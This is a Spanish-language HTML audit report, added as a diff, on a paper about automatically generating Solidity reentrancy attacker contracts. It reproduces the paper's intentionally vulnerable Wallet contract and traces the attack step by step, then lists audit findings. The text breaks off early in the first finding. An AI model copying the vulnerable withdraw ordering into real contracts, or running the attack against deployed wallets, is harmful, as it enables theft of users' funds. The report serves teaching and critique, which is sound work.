@@ -1,0 +1,768 @@
+<!doctype html><html lang="es"><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Auditoría Attacker Contracts</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@500;600;700&family=Source+Serif+4:ital,opsz,wght@0,8..60,400;0,8..60,600;1,8..60,400&display=swap">
+<style>
+/* Layout: technical report — sticky contents rail on wide screens, one 70ch reading column, findings as severity-striped records */
+:root{
+  --paper:#f6f7f9;
+  --sheet:#ffffff;
+  --ink:#17202b;
+  --ink-2:#4a5664;
+  --rule:#d9dee5;
+  --accent:#2a46b0;
+  --accent-soft:#e8ecfa;
+  --code-bg:#eef1f5;
+  --crit:#b3261e; --crit-bg:#fbe9e7;
+  --high:#c25e00; --high-bg:#fdf0e1;
+  --med:#8a6d00;  --med-bg:#fbf5d9;
+  --low:#2f6f4f;  --low-bg:#e5f3ea;
+  --info:#4a5664; --info-bg:#eceff3;
+  --bad-line:#fde6e3;
+  --good-line:#e3f4e8;
+  --f-display:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --f-body:"Source Serif 4",Georgia,"Times New Roman",serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,"SFMono-Regular",Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --paper:#0f141a; --sheet:#151b23; --ink:#e3e8ee; --ink-2:#9aa6b4; --rule:#2a333e;
+    --accent:#8ea4ff; --accent-soft:#1c2540; --code-bg:#1b222c;
+    --crit:#ff8a80; --crit-bg:#3a1714; --high:#ffb36b; --high-bg:#3a2510;
+    --med:#e9cc5a; --med-bg:#332b0c; --low:#7fd3a6; --low-bg:#123022;
+    --info:#aab4c0; --info-bg:#222a34; --bad-line:#3a1a18; --good-line:#14301f;
+    color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --paper:#0f141a; --sheet:#151b23; --ink:#e3e8ee; --ink-2:#9aa6b4; --rule:#2a333e;
+  --accent:#8ea4ff; --accent-soft:#1c2540; --code-bg:#1b222c;
+  --crit:#ff8a80; --crit-bg:#3a1714; --high:#ffb36b; --high-bg:#3a2510;
+  --med:#e9cc5a; --med-bg:#332b0c; --low:#7fd3a6; --low-bg:#123022;
+  --info:#aab4c0; --info-bg:#222a34; --bad-line:#3a1a18; --good-line:#14301f;
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+@media (prefers-reduced-motion: reduce){html{scroll-behavior:auto}}
+body{
+  background:var(--paper); color:var(--ink);
+  font-family:var(--f-body); font-size:18px; line-height:1.62;
+  padding-left:max(16px, env(safe-area-inset-left, 0px));
+  padding-right:max(16px, env(safe-area-inset-right, 0px));
+  padding-block:0;
+}
+a{color:var(--accent); text-underline-offset:2px}
+a:focus-visible, summary:focus-visible{outline:2px solid var(--accent); outline-offset:2px; border-radius:2px}
+.wrap{max-width:1180px; margin:0 auto; display:grid; grid-template-columns:1fr; gap:48px; padding-block:40px 80px}
+@media (min-width:1080px){ .wrap{grid-template-columns:230px minmax(0,1fr)} }
+
+/* contents rail */
+nav.toc{display:none}
+@media (min-width:1080px){
+  nav.toc{display:block; position:sticky; top:calc(env(safe-area-inset-top, 0px) + 32px); align-self:start; font-family:var(--f-display); font-size:13.5px; line-height:1.45}
+}
+nav.toc .lbl{text-transform:uppercase; letter-spacing:.09em; font-size:11px; color:var(--ink-2); font-weight:600; margin-bottom:10px}
+nav.toc ol{list-style:none; padding:0; margin:0; display:grid; gap:7px; counter-reset:t}
+nav.toc li{counter-increment:t; display:grid; grid-template-columns:22px 1fr}
+nav.toc li::before{content:counter(t); color:var(--ink-2); font-family:var(--f-mono); font-size:12px}
+nav.toc a{color:var(--ink); text-decoration:none}
+nav.toc a:hover{color:var(--accent)}
+
+main{min-width:0}
+.sheet{background:var(--sheet); border:1px solid var(--rule); border-radius:4px; padding:clamp(22px,5vw,64px)}
+.col{max-width:70ch}
+
+/* header */
+.eyebrow{font-family:var(--f-mono); font-size:12.5px; letter-spacing:.06em; text-transform:uppercase; color:var(--accent)}
+h1,h2,h3,h4{font-family:var(--f-display); text-wrap:balance; line-height:1.2; color:var(--ink)}
+h1{font-size:clamp(28px,4.4vw,42px); font-weight:700; margin:10px 0 14px; letter-spacing:-.01em}
+.sub{font-size:19px; color:var(--ink-2); margin:0 0 26px; font-style:italic}
+.meta{display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:14px 28px; padding:18px 0; border-top:1px solid var(--rule); border-bottom:1px solid var(--rule); font-family:var(--f-display); font-size:14px}
+.meta div span{display:block; text-transform:uppercase; letter-spacing:.08em; font-size:11px; color:var(--ink-2); font-weight:600; margin-bottom:2px}
+.abstract{margin:30px 0 8px; padding:20px 24px; background:var(--accent-soft); border-radius:4px}
+.abstract h2{font-size:13px; text-transform:uppercase; letter-spacing:.1em; margin:0 0 8px; border:0; padding:0}
+.abstract p{margin:0}
+
+h2{font-size:26px; font-weight:700; margin:64px 0 18px; padding-top:18px; border-top:1px solid var(--rule); display:flex; gap:14px; align-items:baseline}
+h2 .num{font-family:var(--f-mono); font-weight:500; font-size:18px; color:var(--accent)}
+h3{font-size:19.5px; font-weight:600; margin:36px 0 10px}
+h4{font-size:16px; font-weight:600; margin:22px 0 6px}
+p{margin:0 0 16px}
+ul,ol{padding-left:1.3em; margin:0 0 16px}
+li{margin-bottom:6px}
+code{font-family:var(--f-mono); font-size:.84em; background:var(--code-bg); padding:.08em .35em; border-radius:3px}
+.small{font-size:15px; color:var(--ink-2)}
+.kbd{font-family:var(--f-mono); font-size:13px}
+
+/* code listings */
+figure{margin:24px 0}
+figcaption{font-family:var(--f-display); font-size:13.5px; color:var(--ink-2); margin-top:8px}
+figcaption b{color:var(--ink)}
+.code{overflow-x:auto; background:var(--code-bg); border-radius:4px; padding:14px 0; margin:0; font-family:var(--f-mono); font-size:13.5px; line-height:1.6; counter-reset:ln}
+.code .l{display:block; padding:0 18px 0 0; white-space:pre; counter-increment:ln; min-width:max-content}
+.code .l::before{content:counter(ln); display:inline-block; width:3.2em; padding-right:1em; text-align:right; color:var(--ink-2); opacity:.6; user-select:none}
+.code .l.bad{background:var(--bad-line)}
+.code .l.good{background:var(--good-line)}
+.code .c{color:var(--ink-2); font-style:italic}
+.code .k{color:var(--accent)}
+.code .tag{font-family:var(--f-display); font-size:11px; font-weight:700; letter-spacing:.04em; color:var(--crit); margin-left:10px}
+.code .tag.ok{color:var(--low)}
+
+/* tables */
+.tbl{overflow-x:auto; margin:20px 0}
+table{border-collapse:collapse; width:100%; font-family:var(--f-display); font-size:14.5px; font-variant-numeric:tabular-nums}
+th,td{text-align:left; padding:9px 12px; border-bottom:1px solid var(--rule); vertical-align:top}
+th{font-size:11.5px; text-transform:uppercase; letter-spacing:.07em; color:var(--ink-2); font-weight:600}
+td.n{text-align:right; font-family:var(--f-mono); font-size:13.5px}
+tr.hl td{background:var(--accent-soft)}
+
+/* severity */
+.sev{display:inline-block; font-family:var(--f-display); font-size:11px; font-weight:700; letter-spacing:.07em; text-transform:uppercase; padding:3px 8px; border-radius:3px; white-space:nowrap}
+.sev.crit{color:var(--crit); background:var(--crit-bg)}
+.sev.high{color:var(--high); background:var(--high-bg)}
+.sev.med{color:var(--med); background:var(--med-bg)}
+.sev.low{color:var(--low); background:var(--low-bg)}
+.sev.info{color:var(--info); background:var(--info-bg)}
+
+.sevbar{display:flex; height:12px; border-radius:2px; overflow:hidden; margin:18px 0 10px}
+.sevbar span{display:block}
+.legend{display:flex; flex-wrap:wrap; gap:8px 18px; font-family:var(--f-display); font-size:13.5px}
+.legend b{font-family:var(--f-mono); font-weight:500}
+
+/* findings */
+.finding{border:1px solid var(--rule); border-left:4px solid var(--sevc,var(--rule)); border-radius:3px; margin:18px 0; background:var(--sheet)}
+.finding.crit{--sevc:var(--crit)} .finding.high{--sevc:var(--high)} .finding.med{--sevc:var(--med)} .finding.low{--sevc:var(--low)} .finding.info{--sevc:var(--info)}
+.finding summary{list-style:none; cursor:pointer; padding:14px 18px; display:grid; grid-template-columns:auto 1fr auto; gap:6px 14px; align-items:baseline}
+.finding summary::-webkit-details-marker{display:none}
+.finding .id{font-family:var(--f-mono); font-size:13px; color:var(--ink-2)}
+.finding .ttl{font-family:var(--f-display); font-weight:600; font-size:16.5px; line-height:1.35}
+.finding summary::after{content:"+"; font-family:var(--f-mono); color:var(--ink-2); grid-column:3; grid-row:1}
+.finding[open] summary::after{content:"−"}
+.finding summary .sev{grid-column:2; justify-self:start}
+.finding .body{padding:0 18px 16px 18px; font-size:16.5px}
+.finding .body dl{display:grid; grid-template-columns:1fr; gap:4px; margin:0}
+.finding .body dt{font-family:var(--f-display); font-size:11.5px; text-transform:uppercase; letter-spacing:.08em; color:var(--ink-2); font-weight:600; margin-top:12px}
+.finding .body dd{margin:0}
+.finding .body dd p:last-child{margin-bottom:0}
+
+/* diagram */
+.diagram{overflow-x:auto; margin:22px 0 6px}
+.diagram svg{display:block; min-width:760px; width:100%; height:auto}
+.diagram .box{fill:var(--sheet); stroke:var(--rule); stroke-width:1.5}
+.diagram .box.acc{fill:var(--accent-soft); stroke:var(--accent)}
+.diagram .box.out{fill:var(--crit-bg); stroke:var(--crit)}
+.diagram text{fill:var(--ink); font-family:var(--f-display); font-size:13px}
+.diagram text.s{fill:var(--ink-2); font-size:11px; font-family:var(--f-mono)}
+.diagram .arr{stroke:var(--ink-2); stroke-width:1.4; fill:none}
+.diagram .ah{fill:var(--ink-2)}
+.diagram .lane{fill:none; stroke:var(--rule); stroke-dasharray:4 4}
+
+/* scorecard */
+.score{display:grid; gap:12px; margin:18px 0}
+.score .row{display:grid; grid-template-columns:minmax(150px,220px) 1fr auto; gap:14px; align-items:center; font-family:var(--f-display); font-size:14.5px}
+.score .track{height:8px; background:var(--code-bg); border-radius:4px; overflow:hidden}
+.score .fill{height:100%; background:var(--accent); border-radius:4px}
+.score .v{font-family:var(--f-mono); font-size:13px; color:var(--ink-2)}
+@media (max-width:520px){ .score .row{grid-template-columns:1fr auto} .score .track{grid-column:1 / -1; grid-row:2} }
+
+.callout{border:1px solid var(--rule); border-radius:4px; padding:16px 20px; margin:22px 0; background:var(--paper)}
+.callout .h{font-family:var(--f-display); font-weight:600; font-size:14px; margin-bottom:6px}
+.callout p:last-child{margin:0}
+
+.roadmap{display:grid; gap:16px; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); margin:20px 0}
+.roadmap section{border-top:3px solid var(--accent); padding-top:12px; min-width:0}
+.roadmap h4{margin:0 0 4px}
+.roadmap .when{font-family:var(--f-mono); font-size:12px; color:var(--ink-2); margin-bottom:8px}
+.roadmap ul{font-size:15.5px}
+
+.refs{font-size:15px}
+.refs li{margin-bottom:8px}
+footer{margin-top:56px; padding-top:18px; border-top:1px solid var(--rule); font-family:var(--f-display); font-size:13px; color:var(--ink-2)}
+</style>
+
+<div class="wrap">
+  <nav class="toc" aria-label="Contenido">
+    <div class="lbl">Contenido</div>
+    <ol>
+      <li><a href="#resumen">Resumen ejecutivo</a></li>
+      <li><a href="#contexto">Contexto y problema</a></li>
+      <li><a href="#metodo">Cómo funciona el método</a></li>
+      <li><a href="#traza">Traza del ataque encontrado</a></li>
+      <li><a href="#hallazgos">Hallazgos de la auditoría</a></li>
+      <li><a href="#errores">Errores típicos al usarlo</a></li>
+      <li><a href="#futuro">Riesgos a futuro</a></li>
+      <li><a href="#correcciones">Código corregido</a></li>
+      <li><a href="#mejoras">Hoja de ruta de mejoras</a></li>
+      <li><a href="#valoracion">Valoración global</a></li>
+      <li><a href="#refs">Referencias</a></li>
+    </ol>
+  </nav>
+
+  <main>
+  <article class="sheet">
+   <div class="col">
+    <div class="eyebrow">Informe de auditoría técnica · FMBC 2022 · OASIcs vol. 105, art. 3</div>
+    <h1>Generación automática de contratos atacantes en Solidity</h1>
+    <p class="sub">Explicación del trabajo y auditoría independiente de su método, código y validez experimental.</p>
+
+    <div class="meta">
+      <div><span>Obra auditada</span>Ballesteros, Benac-Earle, Bueso de Barrio, Fredlund, Herranz, Mariño (UPM)</div>
+      <div><span>DOI</span><span class="kbd" style="display:inline;text-transform:none;letter-spacing:0;font-size:13px;color:var(--ink)">10.4230/OASIcs.FMBC.2022.3</span></div>
+      <div><span>Alcance</span>Paper completo (14 pp.), listados 1–8, método PBT y resultados</div>
+      <div><span>Fecha del informe</span>15 de noviembre de 2026</div>
+    </div>
+
+    <div class="abstract">
+      <h2>Resumen</h2>
+      <p>El paper propone usar <em>property-based testing</em> (PBT) para generar de forma semialeatoria miles de contratos “atacantes” a partir del ABI de un contrato víctima, desplegarlos en una blockchain local y quedarse con el primero que consiga robar fondos mediante un ataque de reentrancia. El resultado no es un aviso, sino un exploit ejecutable y reducido. La idea es valiosa y está bien orientada. Sin embargo, el trabajo es preliminar: se valida con un único contrato de juguete, varios listados no compilan tal como están escritos, el oráculo de éxito mezcla “beneficio” con “reentrancia” y se omite trabajo previo directamente comparable. Este informe documenta <b>17 hallazgos</b> y una hoja de ruta para llevarlo a un nivel publicable en una conferencia principal o utilizable en auditorías reales.</p>
+    </div>
+
+    <!-- 1 -->
+    <h2 id="resumen"><span class="num">1</span>Resumen ejecutivo</h2>
+    <p>El objetivo del trabajo es pasar de “esta función <em>podría</em> ser reentrante” a “aquí tienes el contrato que la explota y los 7 pasos para reproducirlo”. Herramientas como Slither o Mythril dan diagnósticos; este enfoque da una prueba constructiva. Esa diferencia es su principal aportación.</p>
+    <p>Los problemas más serios no están en la idea, sino en la evidencia y en la ejecución:</p>
+    <ul>
+      <li><b>Reproducibilidad.</b> El contrato atacante del Listado 2 y la plantilla del Listado 3 no compilan con ningún <code>solc</code>. No se publica repositorio, semillas ni versiones.</li>
+      <li><b>Validez.</b> La evaluación es <i>n</i> = 1: un contrato <code>Wallet</code> de 2 funciones, una sola ejecución, sin comparación con otras herramientas ni métricas de precisión o recall.</li>
+      <li><b>Oráculo.</b> “El atacante termina con más ETH del que tenía” no equivale a “hay reentrancia”. Produce falsos positivos (contratos que pagan intereses o recompensas) y falsos negativos (robos de tokens, corrupción de estado, reentrancia de solo lectura).</li>
+      <li><b>Cobertura.</b> La plantilla solo explota reentrada por <code>receive()</code> con ETH. Quedan fuera los hooks ERC‑777/721/1155, la reentrancia entre contratos y la de solo lectura, que son las que han causado los incidentes grandes desde 2020.</li>
+    </ul>
+
+    <div class="sevbar" role="img" aria-label="Distribución de hallazgos: 1 crítico, 4 altos, 6 medios, 4 bajos, 2 informativos">
+      <span style="flex:1;background:var(--crit)"></span>
+      <span style="flex:4;background:var(--high)"></span>
+      <span style="flex:6;background:var(--med)"></span>
+      <span style="flex:4;background:var(--low)"></span>
+      <span style="flex:2;background:var(--info)"></span>
+    </div>
+    <div class="legend">
+      <span><span class="sev crit">Crítica</span> <b>1</b></span>
+      <span><span class="sev high">Alta</span> <b>4</b></span>
+      <span><span class="sev med">Media</span> <b>6</b></span>
+      <span><span class="sev low">Baja</span> <b>4</b></span>
+      <span><span class="sev info">Info</span> <b>2</b></span>
+    </div>
+    <p class="small" style="margin-top:12px">La única severidad crítica corresponde a la vulnerabilidad del contrato víctima, que es intencionada (es el caso de estudio). Ningún hallazgo invalida la idea, pero los cuatro de severidad alta impiden sostener las conclusiones del paper tal como están redactadas.</p>
+
+    <!-- 2 -->
+    <h2 id="contexto"><span class="num">2</span>Contexto y problema</h2>
+    <h3>2.1 Qué es un ataque de reentrancia</h3>
+    <p>En la EVM, enviar ETH a un contrato ejecuta código del receptor (su función <code>receive</code> o <code>fallback</code>). Si la víctima envía el dinero <em>antes</em> de actualizar su contabilidad, el receptor puede volver a llamar a la víctima mientras esta todavía cree que le debe dinero, y repetir el retiro hasta vaciarla.</p>
+    <p>El caso de estudio es una cartera con dos funciones, <code>donate</code> (depositar) y <code>withdraw</code> (retirar todo el saldo propio):</p>
+    <figure>
+<pre class="code"><code><span class="l"><span class="c">// SPDX-License-Identifier: MIT</span></span>
+<span class="l"><span class="k">pragma solidity</span> ^0.8.15;</span>
+<span class="l"></span>
+<span class="l"><span class="k">contract</span> Wallet {</span>
+<span class="l">  mapping(address =&gt; uint) private credit;</span>
+<span class="l"></span>
+<span class="l">  <span class="k">function</span> donate() external payable {</span>
+<span class="l">    require(msg.value &gt; 0 wei);</span>
+<span class="l">    credit[msg.sender] += msg.value;</span>
+<span class="l">  }</span>
+<span class="l"></span>
+<span class="l">  <span class="k">function</span> withdraw() external {</span>
+<span class="l">    uint bal = credit[msg.sender];</span>
+<span class="l">    require(bal &gt; 0);</span>
+<span class="l"></span>
+<span class="l bad">    (bool sent, ) =</span>
+<span class="l bad">      msg.sender.call{value: bal}(&quot;&quot;);   <span class="c">// 1º interacción externa</span><span class="tag">INTERACCIÓN</span></span>
+<span class="l">    require(sent, &quot;Failed to send Ether&quot;);</span>
+<span class="l"></span>
+<span class="l bad">    credit[msg.sender] = 0;               <span class="c">// 2º efecto: demasiado tarde</span><span class="tag">EFECTO</span></span>
+<span class="l">  }</span>
+<span class="l">}</span></code></pre>
+      <figcaption><b>Listado 1 del paper.</b> El orden correcto es Checks → Effects → Interactions (CEI). Aquí la línea 20 debería ir antes de la 16.</figcaption>
+    </figure>
+
+    <h3>2.2 Por qué sigue importando</h3>
+    <p>El paper recuerda el caso The DAO (2016, unos 60 M USD), BurgerSwap (mayo 2021, 7,2 M USD) y Cream Finance (agosto 2021, 18,8 M USD). La reentrancia está catalogada como <a href="https://swcregistry.io/docs/SWC-107" target="_blank" rel="noopener">SWC‑107</a> y aparece en la documentación oficial de Solidity. Desde 2022 los incidentes más caros han sido variantes que la plantilla del paper no cubre (solo lectura, entre contratos, hooks de tokens), algo que se trata en la <a href="#futuro">sección 7</a>.</p>
+
+    <!-- 3 -->
+    <h2 id="metodo"><span class="num">3</span>Cómo funciona el método</h2>
+    <p>La idea central es que todo ataque de reentrancia tiene la misma forma: una <b>fase de disparo</b> (preparar estado y provocar que la víctima envíe ETH) y una <b>fase de recepción</b> (dentro de <code>receive</code>, volver a entrar en la víctima). Esa forma se fija en una plantilla; lo que cambia de una víctima a otra son las secuencias de llamadas, y esas se generan con PBT.</p>
+
+    <div class="diagram" role="img" aria-label="Diagrama del pipeline: ABI de la víctima, generador de llamadas, plantilla atacante, compilación, despliegue en Ganache, ataque, lectura de eventos, oráculo y shrinking hasta el contraejemplo">
+      <svg viewBox="0 0 900 250" xmlns="http://www.w3.org/2000/svg">
+        <defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path class="ah" d="M0 0L10 5L0 10z"/></marker></defs>
+        <rect class="lane" x="6" y="10" width="420" height="104" rx="6"/>
+        <text class="s" x="18" y="28">GENERACIÓN (Elixir · Makina · QuickCheck/PropEr)</text>
+        <rect class="lane" x="6" y="132" width="888" height="108" rx="6"/>
+        <text class="s" x="18" y="150">EJECUCIÓN (máquina de estados PBT sobre Ganache)</text>
+
+        <rect class="box" x="20" y="44" width="110" height="54" rx="4"/>
+        <text x="75" y="67" text-anchor="middle">ABI víctima</text>
+        <text class="s" x="75" y="84" text-anchor="middle">nombre, tipos</text>
+
+        <rect class="box" x="160" y="44" width="120" height="54" rx="4"/>
+        <text x="220" y="67" text-anchor="middle">Generadores</text>
+        <text class="s" x="220" y="84" text-anchor="middle">llamadas + valores</text>
+
+        <rect class="box acc" x="306" y="44" width="110" height="54" rx="4"/>
+        <text x="361" y="67" text-anchor="middle">Plantilla</text>
+        <text class="s" x="361" y="84" text-anchor="middle">trigger / receive</text>
+
+        <path class="arr" d="M130 71H156" marker-end="url(#a)"/>
+        <path class="arr" d="M280 71H302" marker-end="url(#a)"/>
+        <path class="arr" d="M361 98V170H120" marker-end="url(#a)" style="display:none"/>
+        <path class="arr" d="M361 98 V122 H75 V164" marker-end="url(#a)"/>
+
+        <rect class="box" x="20" y="168" width="110" height="54" rx="4"/>
+        <text x="75" y="191" text-anchor="middle">Register</text>
+        <text class="s" x="75" y="208" text-anchor="middle">compila (solc)</text>
+
+        <rect class="box" x="156" y="168" width="110" height="54" rx="4"/>
+        <text x="211" y="191" text-anchor="middle">Deploy</text>
+        <text class="s" x="211" y="208" text-anchor="middle">víctima + atacante</text>
+
+        <rect class="box" x="292" y="168" width="110" height="54" rx="4"/>
+        <text x="347" y="191" text-anchor="middle">Attack</text>
+        <text class="s" x="347" y="208" text-anchor="middle">attack(){value}</text>
+
+        <rect class="box" x="428" y="168" width="110" height="54" rx="4"/>
+        <text x="483" y="191" text-anchor="middle">Get Events</text>
+        <text class="s" x="483" y="208" text-anchor="middle">decodifica logs</text>
+
+        <rect class="box acc" x="564" y="168" width="120" height="54" rx="4"/>
+        <text x="624" y="191" text-anchor="middle">Oráculo</text>
+        <text class="s" x="624" y="208" text-anchor="middle">Successful…(true)?</text>
+
+        <rect class="box out" x="712" y="168" width="170" height="54" rx="4"/>
+        <text x="797" y="191" text-anchor="middle">Shrinking → exploit</text>
+        <text class="s" x="797" y="208" text-anchor="middle">113 → 15 comandos</text>
+
+        <path class="arr" d="M130 195H152" marker-end="url(#a)"/>
+        <path class="arr" d="M266 195H288" marker-end="url(#a)"/>
+        <path class="arr" d="M402 195H424" marker-end="url(#a)"/>
+        <path class="arr" d="M538 195H560" marker-end="url(#a)"/>
+        <path class="arr" d="M684 195H708" marker-end="url(#a)"/>
+        <path class="arr" d="M624 168 V146 H220 V102" marker-end="url(#a)" stroke-dasharray="3 3"/>
+        <text class="s" x="440" y="141" text-anchor="middle">false → nuevo candidato</text>
+      </svg>
+    </div>
+    <p class="small">Figura A. Pipeline reconstruido a partir de las secciones 3–5 del paper.</p>
+
+    <h3>3.1 Las piezas</h3>
+    <ol>
+      <li><b>Generador de llamadas guiado por ABI.</b> Elige una función del ABI de la víctima y genera valores válidos para sus argumentos según el tipo Solidity (<code>uint</code> → entero no negativo, etc.). Si la función es <code>payable</code>, genera además una cantidad de ether. Los tipos <code>function</code>, <code>fixedNxM</code> y <code>ufixedNxM</code> no están soportados.</li>
+      <li><b>Generador de contratos atacantes.</b> Rellena dos huecos de la plantilla con secuencias de llamadas: <code>trigger_sequence</code> (dentro de <code>attack()</code>) y <code>receive_sequence</code> (dentro de <code>receive()</code>, protegida por <code>try/catch</code> y por la condición <code>has_funds</code>).</li>
+      <li><b>Comandos de la máquina de estados.</b> <code>Register</code> compila el atacante; <code>Deploy</code> despliega víctima y atacante; <code>Attack</code> invoca <code>attack()</code> y declara que espera <code>SuccessfulAttack(false)</code>; <code>Get Events</code> recupera el evento real.</li>
+      <li><b>La inversión clave.</b> El modelo afirma “ningún ataque tiene éxito”. Cuando la blockchain contradice al modelo, el test <em>falla</em>, y ese fallo es el hallazgo. El contraejemplo que entrega PBT <em>es</em> el exploit.</li>
+      <li><b>Shrinking.</b> PBT reduce el contraejemplo: de 22 + 32 llamadas generadas a 2 + 1, y de 113 comandos a 15. El atacante resultante coincide con el escrito a mano en el Listado 2.</li>
+    </ol>
+
+    <h3>3.2 Infraestructura</h3>
+    <p>Elixir con <b>Makina</b> (DSL de los propios autores para modelos PBT con estado), compatible con Quviq QuickCheck y PropEr/PropCheck. Blockchain local con <b>Ganache</b>, una instancia nueva por test. Tiempo: 2 min 30 s hasta encontrar el atacante y 1 min de shrinking, en un i7‑11800H con 16 GB de RAM.</p>
+
+    <!-- 4 -->
+    <h2 id="traza"><span class="num">4</span>Traza del ataque encontrado</h2>
+    <p>Reconstrucción paso a paso del contraejemplo reducido (Listados 7 y 8). Los valores se interpretan en wei; el paper dice “1 ether” pero el código usa <code>value: 1</code> (véase hallazgo B‑02).</p>
+    <div class="tbl">
+      <table>
+        <thead><tr><th>Paso</th><th>Acción</th><th style="text-align:right">Saldo víctima</th><th style="text-align:right">Saldo atacante</th><th style="text-align:right">credit[atacante]</th></tr></thead>
+        <tbody>
+          <tr><td class="n">1</td><td>Deploy víctima, <code>value: 0</code></td><td class="n">0</td><td class="n">—</td><td class="n">0</td></tr>
+          <tr><td class="n">2</td><td>Cuenta honesta: <code>donate{value:1}</code></td><td class="n">1</td><td class="n">—</td><td class="n">0</td></tr>
+          <tr><td class="n">3</td><td><code>attack{value:2}</code> → <code>init = 2</code></td><td class="n">1</td><td class="n">2</td><td class="n">0</td></tr>
+          <tr><td class="n">4</td><td>trigger: <code>donate{value:1}</code></td><td class="n">2</td><td class="n">1</td><td class="n">1</td></tr>
+          <tr><td class="n">5</td><td>trigger: <code>withdraw()</code> → envía 1</td><td class="n">1</td><td class="n">2</td><td class="n">1</td></tr>
+          <tr class="hl"><td class="n">6</td><td><code>receive</code>: 1 ≥ 1 → reentra <code>withdraw()</code> → envía 1</td><td class="n">0</td><td class="n">3</td><td class="n">1</td></tr>
+          <tr><td class="n">7</td><td><code>receive</code>: 0 ≥ 1 falso → para; ambos frames ponen credit = 0</td><td class="n">0</td><td class="n">3</td><td class="n">0</td></tr>
+          <tr><td class="n">8</td><td><code>end = 3 &gt; init = 2</code> → <code>SuccessfulAttack(true)</code></td><td class="n">0</td><td class="n">3</td><td class="n">0</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>El atacante gana 1 wei, que es exactamente el depósito de la cuenta honesta. Un detalle a favor del caso de estudio: como <code>withdraw</code> usa <code>credit = 0</code> (asignación) y no <code>credit -= bal</code>, la aritmética comprobada de Solidity 0.8 no revierte el ataque. Con <code>-=</code> el resultado cambiaría (véase M‑05).</p>
+
+    <!-- 5 -->
+    <h2 id="hallazgos"><span class="num">5</span>Hallazgos de la auditoría</h2>
+    <p>Cada hallazgo indica severidad, ubicación en el paper, escenario de fallo y recomendación. La severidad mide el impacto sobre la validez del trabajo o sobre quien adopte el método, no la calidad del texto.</p>
+
+    <div class="tbl">
+      <table>
+        <thead><tr><th>ID</th><th>Hallazgo</th><th>Severidad</th></tr></thead>
+        <tbody>
+          <tr><td class="kbd">V‑01</td><td>Reentrancia en <code>Wallet.withdraw</code> (intencionada)</td><td><span class="sev crit">Crítica</span></td></tr>
+          <tr><td class="kbd">A‑01</td><td>Los listados de Solidity no compilan</td><td><span class="sev high">Alta</span></td></tr>
+          <tr><td class="kbd">A‑02</td><td>Oráculo “beneficio en ETH” ≠ reentrancia</td><td><span class="sev high">Alta</span></td></tr>
+          <tr><td class="kbd">A‑03</td><td>Evaluación con un único contrato y una ejecución</td><td><span class="sev high">Alta</span></td></tr>
+          <tr><td class="kbd">A‑04</td><td>Se omite trabajo previo de generación automática de exploits</td><td><span class="sev high">Alta</span></td></tr>
+          <tr><td class="kbd">M‑01</td><td>La plantilla solo cubre reentrada por <code>receive()</code> con ETH</td><td><span class="sev med">Media</span></td></tr>
+          <tr><td class="kbd">M‑02</td><td>Búsqueda ciega y coste por test: no escala</td><td><span class="sev med">Media</span></td></tr>
+          <tr><td class="kbd">M‑03</td><td>Generación de argumentos sin contexto ni conocimiento del despliegue</td><td><span class="sev med">Media</span></td></tr>
+          <tr><td class="kbd">M‑04</td><td>Dependencias obsoletas o de licencia comercial</td><td><span class="sev med">Media</span></td></tr>
+          <tr><td class="kbd">M‑05</td><td><code>try/catch</code> silencioso: oculta causas y altera la semántica</td><td><span class="sev med">Media</span></td></tr>
+          <tr><td class="kbd">M‑06</td><td>Herramienta de doble uso sin salvaguardas ni discusión ética</td><td><span class="sev med">Media</span></td></tr>
+          <tr><td class="kbd">B‑01</td><td>Resultados no deterministas y sin semilla publicada</td><td><span class="sev low">Baja</span></td></tr>
+          <tr><td class="kbd">B‑02</td><td>Unidades ambiguas (wei frente a ether)</td><td><span class="sev low">Baja</span></td></tr>
+          <tr><td class="kbd">B‑03</td><td>Nombres inconsistentes entre listados y texto</td><td><span class="sev low">Baja</span></td></tr>
+          <tr><td class="kbd">B‑04</td><td>Pragmas flotantes e incoherentes</td><td><span class="sev low">Baja</span></td></tr>
+          <tr><td class="kbd">I‑01</td><td>Erratas y referencias defectuosas</td><td><span class="sev info">Info</span></td></tr>
+          <tr><td class="kbd">I‑02</td><td>Heurística <code>has_funds</code> no maximiza el drenaje</td><td><span class="sev info">Info</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="small">Los detalles se pueden desplegar. Los de severidad crítica y alta aparecen abiertos.</p>
+
+    <h3>5.1 Contrato víctima</h3>
+    <details class="finding crit" open>
+      <summary><span class="id">V‑01</span><span class="ttl">Reentrancia en <code>Wallet.withdraw</code></span><span class="sev crit">Crítica</span></summary>
+      <div class="body"><dl>
+        <dt>Ubicación</dt><dd>Listado 1, líneas 16–20.</dd>
+        <dt>Descripción</dt><dd><p>La transferencia (<code>call{value: bal}</code>) se ejecuta antes de poner el saldo a cero, y se reenvía todo el gas restante. Cualquier contrato que deposite puede vaciar los fondos de todos los demás usuarios.</p></dd>
+        <dt>Escenario</dt><dd><p>La traza de la <a href="#traza">sección 4</a>: el atacante recupera su depósito más los depósitos ajenos.</p></dd>
